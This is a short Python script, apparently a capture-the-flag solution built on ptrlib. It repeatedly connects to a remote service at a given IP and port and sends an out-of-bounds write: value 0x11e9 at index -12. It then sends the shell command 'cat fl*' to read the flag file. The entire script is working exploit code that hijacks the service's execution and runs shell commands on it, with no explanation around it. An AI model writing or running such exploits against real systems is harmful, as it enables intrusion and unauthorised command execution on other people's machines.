from ptrlib import *
while 1:
    io = Socket("nc 34.170.146.252 27095", quiet=True)
    try:
        io.sendlineafter(b"pos > ", -12)
        io.sendlineafter(b"val > ", 0x11e9)
        io.sendline(b"cat fl*")
        print(io.recvline())
        break
    except:
        continue
